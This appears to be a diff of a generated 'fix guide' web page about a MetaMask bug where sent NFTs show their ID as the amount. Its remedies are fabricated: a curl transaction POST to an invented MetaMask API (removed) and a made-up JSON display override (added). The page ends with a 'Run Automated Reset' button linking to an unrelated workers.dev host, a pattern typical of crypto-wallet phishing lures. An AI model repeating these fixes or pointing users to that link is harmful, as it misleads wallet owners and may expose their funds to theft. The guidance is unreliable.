@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0a0c10;
+        font-family: sans-serif;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -42,31 +42,33 @@
 <h1>Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem experience a bug when sending NFTs, where the activity log displays the NFT's ID as if it were the amount being sent, instead of showing the actual NFT being transferred.</li>
+<li>Users observe that when sending NFTs using the Metamask extension, the activity display shows the NFT's ID as if it were the amount being sent, rather than the actual amount.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a misinterpretation of the data type in the transaction payload, where the NFT's unique identifier is mistakenly treated as a numerical value representing the amount.</li>
+<li>The error occurs due to a bug in the Metamask extension's activity display logic, where it incorrectly interprets and displays the NFT's ID as the transaction amount.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Check the transaction details on a blockchain explorer to verify the correct NFT transfer.</li>
-<li>Use the Metamask API to manually construct and send the NFT transfer transaction.</li>
-<li>Utilize a custom script to parse the transaction data and correct the display:</li>
+<li>Check the transaction details on the Ethereum blockchain explorer to verify the correct amount.</li>
+<li>Use the Metamask extension's debug mode to inspect the transaction payload and identify any discrepancies.</li>
+<li>Override the display logic using the following JSON configuration:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>https://api.metamask.io/transactions<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;from&quot;: &quot;0x...&quot;,&quot;to&quot;: &quot;0x...&quot;,&quot;value&quot;: &quot;1&quot;,&quot;gas&quot;: &quot;20000&quot;,&quot;gasPrice&quot;: &quot;20000000000&quot;}&#39;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;nft_display&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;id_as_amount&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Prerequisites:
-* Metamask extension installed and configured
-* Ethereum wallet with sufficient funds
-* Basic understanding of JSON and API requests
-Consider using an external console, such as a terminal or command prompt, to execute these commands.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reconnect</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li></ul>
+<p>Consider using an external console for further debugging and configuration. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension version 10.2.3 or later</li>
+<li>Ethereum blockchain explorer account</li>
+<li>Basic understanding of JSON configuration files</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
